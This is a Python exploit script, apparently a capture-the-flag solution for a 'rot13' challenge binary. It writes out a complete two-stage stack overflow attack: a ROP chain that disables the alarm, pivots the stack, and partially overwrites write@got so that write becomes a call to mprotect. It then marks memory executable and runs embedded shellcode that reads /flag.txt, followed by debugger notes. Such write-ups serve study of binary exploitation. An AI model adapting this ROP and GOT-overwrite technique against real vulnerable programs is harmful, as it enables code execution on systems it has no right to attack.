"""
Unintended solution observed during the competition.
This solution is smarter and can be appliable in many other situations.
"""
from ptrlib import *
from time import sleep
import urllib

elf = ELF("../distfiles/rot13")
libc = ELF("../distfiles/libc-2.28.so")
rop_pop_rdx_rbp = 0x40047e
rop_leave = 0x4004b6
addr_vuln = 0x400481
addr_shellcode = 0x601100
addr_stage2 = 0x601400
# http://shell-storm.org/shellcode/files/shellcode-878.php
shellcode = b'\xeb\x3f\x5f\x80\x77\x09\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x00\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x00\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xff/flag.txtA'

def set_rdi_rsi(rdi, rsi):
    payload  = p64(0x400425)
    payload += p64(rop_pop_rdx_rbp)
    payload += p64(rdi)
    payload += p64(rsi)
    return payload
def set_rdx_rbp(rdx, rbp):
    payload  = p64(rop_pop_rdx_rbp)
    payload += p64(rdx)
    payload += p64(rbp)
    return payload

## Stage 1
payload1 = b'\x00' * 0x48
# alarm(0)
payload1 += set_rdi_rsi(0, 0)
payload1 += p64(elf.plt("alarm"))
# read(0, addr_stage2, 0x200)
payload1 += set_rdi_rsi(0, addr_stage2)
payload1 += set_rdx_rbp(0x200, addr_stage2 - 8)
payload1 += p64(elf.plt("read"))
payload1 += p64(rop_leave)
payload1 += b'A' * (0x100 - len(payload1))

## Stage 2
payload2 = b''
# read(0, addr_shellcode, len(shellcode))
payload2 += set_rdi_rsi(0, addr_shellcode)
payload2 += set_rdx_rbp(len(shellcode), 0)
payload2 += p64(elf.plt("read"))
# read(0, write@got - SYS_mprotect + 1, SYS_mprotect)
payload2 += set_rdi_rsi(0, elf.got("write") - 9)
payload2 += set_rdx_rbp(10, 0)
payload2 += p64(elf.plt("read"))
# mprotect(addr_shellcode & 0xfffffffffffff000, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC)
payload2 += set_rdi_rsi(addr_shellcode & 0xfffffffffffff000, 0x1000)
payload2 += set_rdx_rbp(0b111, 0)
payload2 += p64(elf.plt("write"))
# run shellcode
payload2 += p64(addr_shellcode)
payload2 += b'A' * (0x200 - len(payload2))

"""
pwndbg> p/x &write
$2 = 0x7ffff7af4140
pwndbg> find /2b 0x7ffff7af4100, 0x7ffff7af41ff, 0x0f, 0x05
0x7ffff7af4112 <__GI___read_nocancel+2>
0x7ffff7af4152 <__GI___libc_write+18>
2 patterns found.
"""
whole_payload  = payload1
whole_payload += payload2
whole_payload += shellcode
whole_payload += b'A' * 9 + b'\x12'

# pwn locally
sock = Process("../distfiles/rot13")
sock.send(whole_payload)
sock.interactive()
